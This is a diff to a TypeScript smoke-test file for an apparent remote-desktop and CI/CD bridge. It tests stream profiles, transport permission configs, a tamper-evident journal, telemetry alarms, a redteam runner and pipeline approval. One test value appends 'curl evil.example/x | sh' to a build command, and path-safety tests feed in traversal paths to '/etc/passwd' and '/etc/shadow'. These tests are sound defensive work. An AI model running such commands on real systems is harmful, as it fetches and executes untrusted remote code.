@@ -91,8 +91,11 @@ assert.equal(
   false
 );
 
-const freshDesktop = applyHeartbeat(BIFROST_DEVICES[0], new Date());
-const gpuBox = applyHeartbeat(BIFROST_DEVICES[1], new Date());
+// Looked up by id, not index: the seed array grows as devices are added.
+const seedDesktop = BIFROST_DEVICES.find(d => d.deviceId === 'desktop_primary')!;
+const seedGpu = BIFROST_DEVICES.find(d => d.deviceId === 'gpu_workstation')!;
+const freshDesktop = applyHeartbeat(seedDesktop, new Date());
+const gpuBox = applyHeartbeat(seedGpu, new Date());
 
 // Heimdall narrows: Sunshine cannot carry file transfer, so the scope is refused
 // rather than the whole crossing being denied.
@@ -157,7 +160,7 @@ const staleDenied = evaluateCrossing(
     purpose: 'smoke test',
     requestedBy: 'test',
   },
-  { device: BIFROST_DEVICES[0] } // no heartbeat applied
+  { device: seedDesktop } // no heartbeat applied
 );
 assert.equal(staleDenied.verdict, 'DENY');
 
@@ -193,7 +196,7 @@ expiring = transition(expiring, 'provisioning', { now: new Date('2026-08-10T12:0
 expiring = transition(expiring, 'active', { now: new Date('2026-08-10T12:00:30Z') });
 
 const tick = tickBifrostSupervisor({
-  devices: [applyHeartbeat(BIFROST_DEVICES[0], new Date('2026-08-10T12:04:50Z'))],
+  devices: [applyHeartbeat(seedDesktop, new Date('2026-08-10T12:04:50Z'))],
   sessions: [expiring],
   now: new Date('2026-08-10T12:05:00Z'),
 });
@@ -212,7 +215,7 @@ liveSession = transition(liveSession, 'provisioning', { now: new Date('2026-08-1
 liveSession = transition(liveSession, 'active', { now: new Date('2026-08-10T12:04:55Z') });
 
 const revokingTick = tickBifrostSupervisor({
-  devices: [applyHeartbeat(BIFROST_DEVICES[0], new Date('2026-08-10T12:04:50Z'))],
+  devices: [applyHeartbeat(seedDesktop, new Date('2026-08-10T12:04:50Z'))],
   sessions: [liveSession],
   observations: [
     { peerAddress: '198.51.100.7', protocol: 'tcp', direction: 'inbound', bytes: 128, observedAt: '2026-08-10T12:04:59Z' },
@@ -272,5 +275,311 @@ assert.equal(
   true
 );
 assert.ok(approvedCrossing.ledgerEvent?.eventId);
+
+// --- Desktop provisioning -------------------------------------------------
+
+const { negotiateStreamProfile, adaptStreamProfile, bitrateFor, RESOLUTION_LADDER, CONSERVATIVE_CAPABILITY } =
+  await import('../bifrost/desktop/stream-profile');
+const { buildRustDeskConfig, buildSunshineConfig } = await import('../bifrost/desktop/transport-configs');
+const { buildProvisioningPlan, buildTeardownPlan, isSafeTarget } = await import('../bifrost/desktop/node-provisioner');
+
+// The bitrate model is anchored on Moonlight's 1080p60 h264 default of ~20 Mbps.
+const anchor = bitrateFor(RESOLUTION_LADDER[2], 60, 'h264');
+assert.ok(anchor > 19000 && anchor < 21000, `1080p60 h264 should be ~20 Mbps, got ${anchor} kbps`);
+// More efficient codecs cost less for the same picture.
+assert.ok(bitrateFor(RESOLUTION_LADDER[2], 60, 'av1') < bitrateFor(RESOLUTION_LADDER[2], 60, 'hevc'));
+
+// Without a reported encoder we provision conservatively and say so.
+const conservative = negotiateStreamProfile(
+  { fidelity: 'view', scopes: ['screen_view'], preferredFps: 120 },
+  CONSERVATIVE_CAPABILITY
+);
+assert.equal(conservative.resolution.label, '1080p');
+assert.equal(conservative.fps, 60);
+assert.equal(conservative.inputEnabled, false);
+
+// Input follows the granted scope, never the request.
+const interactive = negotiateStreamProfile(
+  { fidelity: 'interact', scopes: ['screen_view', 'input_inject'] },
+  CONSERVATIVE_CAPABILITY
+);
+assert.equal(interactive.inputEnabled, true);
+
+// A narrow link forces a step down the ladder during negotiation.
+const constrained = negotiateStreamProfile(
+  { fidelity: 'view', scopes: ['screen_view'] },
+  { ...CONSERVATIVE_CAPABILITY, hardwareEncode: true, maxResolution: RESOLUTION_LADDER[0], maxFps: 60, codecs: ['h264'] },
+  { rttMs: 20, packetLossPct: 0, jitterMs: 2, availableKbps: 12000, observedAt: new Date().toISOString() }
+);
+assert.ok(constrained.bitrateKbps <= 12000 * 0.8);
+
+// Congestion degrades fps first, and the floor holds rather than going negative.
+const degraded = adaptStreamProfile(interactive, {
+  rttMs: 250,
+  packetLossPct: 6,
+  jitterMs: 40,
+  availableKbps: 5000,
+  observedAt: new Date().toISOString(),
+});
+assert.equal(degraded.direction, 'step_down');
+assert.ok(degraded.profile.fps < interactive.fps);
+
+// RustDesk capability flags are derived from scopes, not from preference.
+const viewOnlyEnvelope = signSessionEnvelope(
+  { ...vectorClaims, sessionId: 'bfs_view', transport: 'rustdesk_control' as const, scopes: ['screen_view'] as any },
+  VECTOR_SECRET
+);
+const viewOnlyConfig = buildRustDeskConfig(viewOnlyEnvelope);
+assert.equal(viewOnlyConfig.permissions['enable-keyboard'], false);
+assert.equal(viewOnlyConfig.permissions['enable-file-transfer'], false);
+assert.equal(viewOnlyConfig.permissions['enable-clipboard'], false);
+
+const transferEnvelope = signSessionEnvelope(
+  {
+    ...vectorClaims,
+    sessionId: 'bfs_transfer',
+    transport: 'rustdesk_control' as const,
+    fidelity: 'control' as const,
+    scopes: ['screen_view', 'file_push'] as any,
+  },
+  VECTOR_SECRET
+);
+assert.equal(buildRustDeskConfig(transferEnvelope).permissions['enable-file-transfer'], true);
+// Still no keyboard: file transfer was granted, input was not.
+assert.equal(buildRustDeskConfig(transferEnvelope).permissions['enable-keyboard'], false);
+
+// Sunshine disables host input devices when input was not granted.
+const sunshineCfg = buildSunshineConfig(vectorEnvelope, conservative);
+assert.equal(sunshineCfg.settings.keyboard, 'disabled');
+assert.equal(sunshineCfg.settings.mouse, 'disabled');
+
+// Provisioning plans never contain absolute or traversing paths.
+assert.equal(isSafeTarget('sunshine.conf'), true);
+assert.equal(isSafeTarget('/etc/passwd'), false);
+assert.equal(isSafeTarget('../../etc/shadow'), false);
+
+const plan = buildProvisioningPlan({ envelope: vectorEnvelope, hostAddress: '100.64.0.10' });
+assert.ok(plan.steps.every(step => isSafeTarget(step.target)));
+assert.ok(plan.steps.some(step => step.verb === 'start_transport'));
+assert.ok(plan.client?.args.includes('--no-keyboard'), 'view-only session must disable Moonlight input');
+assert.equal(buildTeardownPlan(vectorEnvelope).steps[0].verb, 'stop_transport');
+
+// --- Monitoring -----------------------------------------------------------
+
+const { SessionJournal, verifyJournalChain } = await import('../bifrost/observability/session-journal');
+const { assessTelemetry, telemetryAlarms, TelemetryWindow } = await import('../bifrost/observability/node-telemetry');
+
+const journal = new SessionJournal();
+journal.append({ kind: 'crossing_requested', actor: 'test', summary: 'requested' });
+journal.append({ kind: 'session_issued', actor: 'test', summary: 'issued', sessionId: 'bfs_1' });
+journal.append({ kind: 'session_closed', actor: 'test', summary: 'closed', sessionId: 'bfs_1' });
+assert.equal(journal.verify().ok, true);
+assert.equal(journal.size(), 3);
+
+// Editing an entry after the fact breaks the chain and is located precisely.
+const tamperedEntries = journal.all();
+tamperedEntries[1] = { ...tamperedEntries[1], summary: 'issued (edited)' };
+const chainCheck = verifyJournalChain(tamperedEntries);
+assert.equal(chainCheck.ok, false);
+assert.equal(chainCheck.brokenAt, 1);
+
+// Dropping an entry is detected too.
+const truncated = journal.all().filter((_, i) => i !== 1);
+assert.equal(verifyJournalChain(truncated).ok, false);
+
+const healthyReport = {
+  deviceId: 'desktop_primary',
+  link: { rttMs: 15, packetLossPct: 0, jitterMs: 3, availableKbps: 50000, observedAt: new Date().toISOString() },
+  reportedAt: new Date().toISOString(),
+};
+assert.equal(assessTelemetry(healthyReport).health, 'healthy');
+
+const failingReport = {
+  ...healthyReport,
+  link: { rttMs: 400, packetLossPct: 12, jitterMs: 60, availableKbps: 900, observedAt: new Date().toISOString() },
+};
+assert.equal(assessTelemetry(failingReport).health, 'failing');
+assert.equal(assessTelemetry(failingReport).transportUnhealthy, true);
+
+// A node reporting a scope it was never granted is a halting condition.
+const driftAlarms = telemetryAlarms({ ...healthyReport, activeScopes: ['screen_view', 'shell_exec'] }, ['screen_view']);
+assert.equal(driftAlarms.some(a => a.rule === 'scope_drift' && a.halts), true);
+
+const window = new TelemetryWindow(5);
+window.push(healthyReport);
+window.push(healthyReport);
+assert.equal(window.cleanStreak(), 2);
+window.push(failingReport);
+assert.equal(window.cleanStreak(), 0);
+
+// --- Camelot Defense Redteam ---------------------------------------------
+
+const { runRedteam, redteamAlarms } = await import('../bifrost/redteam/redteam-runner');
+const { reachableScopes } = await import('../bifrost/redteam/redteam-probes');
+
+// A device that denies control scopes cannot reach them by any transport.
+assert.equal(reachableScopes(seedGpu).includes('shell_exec'), false);
+assert.equal(reachableScopes(seedDesktop).includes('shell_exec'), true);
+
+const posture = runRedteam({
+  devices: [freshDesktop, gpuBox],
+  sessions: [],
+  sharedSigningSecret: true,
+});
+assert.ok(posture.findings.some(f => f.probeId === 'shared_secret'));
+assert.ok(posture.findings.some(f => f.probeId === 'blast_radius'));
+assert.ok(posture.postureScore < 100);
+// Exposure is ranked, and every device is accounted for.
+assert.equal(posture.exposure.length, 2);
+
+// A broken journal is critical and closes the bridge.
+const tamperedPosture = runRedteam({ devices: [freshDesktop], sessions: [], journal: tamperedEntries });
+assert.equal(tamperedPosture.haltRecommended, true);
+assert.ok(redteamAlarms(tamperedPosture).some(a => a.halts));
+
+// A clean posture on a minimal config produces no halting alarms.
+const quietPosture = runRedteam({ devices: [], sessions: [] });
+assert.equal(quietPosture.haltRecommended, false);
+assert.equal(quietPosture.postureScore, 100);
+
+// --- Private CI/CD --------------------------------------------------------
+
+const { validatePipeline, pipelineScopes } = await import('../bifrost/cicd/pipeline-schema');
+const { authorizePipeline, verifyPipelineGrant, pipelineHash } = await import('../bifrost/cicd/pipeline-authorization');
+const { planPipelineRun } = await import('../bifrost/cicd/pipeline-runtime');
+
+const acmeRunner = applyHeartbeat(
+  BIFROST_DEVICES.find(d => d.deviceId === 'tenant_acme_runner')!,
+  new Date()
+);
+
+const buildPipeline = {
+  pipelineId: 'acme_build',
+  name: 'Acme Build',
+  tenantId: 'tenant_acme',
+  version: '1.0.0',
+  maxDurationSeconds: 1800,
+  stages: [
+    {
+      id: 'build',
+      name: 'Build',
+      deviceId: 'tenant_acme_runner',
+      transport: 'tauri_agent' as const,
+      steps: [
+        { id: 'checkout', name: 'Checkout', kind: 'checkout' as const, command: 'git fetch --depth 1', requiredScopes: [] as any, timeoutSeconds: 60 },
+        { id: 'compile', name: 'Compile', kind: 'build' as const, command: 'npm run build', requiredScopes: [] as any, timeoutSeconds: 600, dependsOn: ['checkout'] },
+      ],
+    },
+  ],
+};
+
+assert.equal(validatePipeline(buildPipeline).ok, true);
+assert.ok(pipelineScopes(buildPipeline).includes('shell_exec'));
+
+// A build step with no command cannot be pinned, so it cannot be approved.
+assert.equal(
+  validatePipeline({
+    ...buildPipeline,
+    stages: [{ ...buildPipeline.stages[0], steps: [{ id: 'x', name: 'x', kind: 'build' as const, requiredScopes: [] as any, timeoutSeconds: 10 }] }],
+  }).ok,
+  false
+);
+
+const limits = {
+  scopeCeiling: ['shell_exec', 'file_pull', 'process_list'] as any,
+  allowedDeviceIds: ['tenant_acme_runner'],
+  maxRunsPerHour: 4,
+  expiresAt: new Date(Date.now() + 86400_000).toISOString(),
+};
+
+const issued = authorizePipeline({ pipeline: buildPipeline, limits, approvedBy: 'operator', secret: VECTOR_SECRET });
+assert.equal(issued.ok, true);
+const grant = issued.grant!;
+assert.equal(verifyPipelineGrant(grant, buildPipeline, VECTOR_SECRET).ok, true);
+
+// A grant cannot be issued for a pipeline that exceeds its own ceiling.
+assert.equal(
+  authorizePipeline({
+    pipeline: buildPipeline,
+    limits: { ...limits, scopeCeiling: ['process_list'] as any },
+    approvedBy: 'operator',
+    secret: VECTOR_SECRET,
+  }).ok,
+  false
+);
+
+// The core property: editing a command invalidates the approval.
+const editedPipeline = {
+  ...buildPipeline,
+  stages: [
+    {
+      ...buildPipeline.stages[0],
+      steps: [
+        buildPipeline.stages[0].steps[0],
+        { ...buildPipeline.stages[0].steps[1], command: 'npm run build && curl evil.example/x | sh' },
+      ],
+    },
+  ],
+};
+assert.notEqual(pipelineHash(editedPipeline), pipelineHash(buildPipeline));
+const editedCheck = verifyPipelineGrant(grant, editedPipeline, VECTOR_SECRET);
+assert.equal(editedCheck.ok, false);
+assert.ok(editedCheck.reason.includes('Re-approval required'));
+
+// A valid run plans one crossing per stage.
+const goodPlan = planPipelineRun({
+  pipeline: buildPipeline,
+  grant,
+  secret: VECTOR_SECRET,
+  devices: [acmeRunner],
+});
+assert.equal(goodPlan.ok, true);
+assert.equal(goodPlan.stages.length, 1);
+assert.equal(goodPlan.stages[0].request.fidelity, 'control');
+assert.deepEqual(goodPlan.stages[0].stepOrder, ['checkout', 'compile']);
+
+// Tenant isolation: a house device with no tenantId is never targetable.
+const houseTargeting = { ...buildPipeline, stages: [{ ...buildPipeline.stages[0], deviceId: 'desktop_primary' }] };
+const houseGrant = authorizePipeline({
+  pipeline: houseTargeting,
+  limits: { ...limits, allowedDeviceIds: ['desktop_primary'] },
+  approvedBy: 'operator',
+  secret: VECTOR_SECRET,
+}).grant!;
+const housePlan = planPipelineRun({
+  pipeline: houseTargeting,
+  grant: houseGrant,
+  secret: VECTOR_SECRET,
+  devices: [freshDesktop],
+});
+assert.equal(housePlan.ok, false);
+assert.ok(housePlan.errors.some(e => e.includes('no tenantId')));
+
+// Cross-tenant targeting is refused even when the grant allows the device.
+const otherTenantRunner = { ...acmeRunner, tenantId: 'tenant_other' };
+const crossPlan = planPipelineRun({
+  pipeline: buildPipeline,
+  grant,
+  secret: VECTOR_SECRET,
+  devices: [otherTenantRunner],
+});
+assert.equal(crossPlan.ok, false);
+assert.ok(crossPlan.errors.some(e => e.includes('Tenant isolation violation')));
+
+// Rate limiting is enforced from the grant.
+const busyPlan = planPipelineRun({
+  pipeline: buildPipeline,
+  grant,
+  secret: VECTOR_SECRET,
+  devices: [acmeRunner],
+  recentRuns: Array.from({ length: 4 }, (_, i) => ({
+    runId: `r${i}`,
+    pipelineId: 'acme_build',
+    tenantId: 'tenant_acme',
+    startedAt: new Date().toISOString(),
+  })),
+});
+assert.equal(busyPlan.ok, false);
+assert.ok(busyPlan.errors.some(e => e.includes('Rate limit')));
 
 console.log('Camelot smoke tests passed.');
